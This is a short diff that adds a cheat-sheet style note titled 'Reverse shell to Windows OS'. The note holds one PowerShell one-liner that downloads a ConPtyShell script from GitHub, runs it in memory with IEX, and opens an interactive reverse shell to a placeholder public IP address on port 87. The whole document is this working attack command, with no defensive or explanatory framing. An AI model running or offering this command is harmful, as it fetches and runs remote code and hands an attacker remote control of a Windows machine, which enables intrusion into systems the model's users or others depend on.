@@ -1,0 +1,2 @@
+Reverse shell to Windows OS
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell thepublicipaddress 87
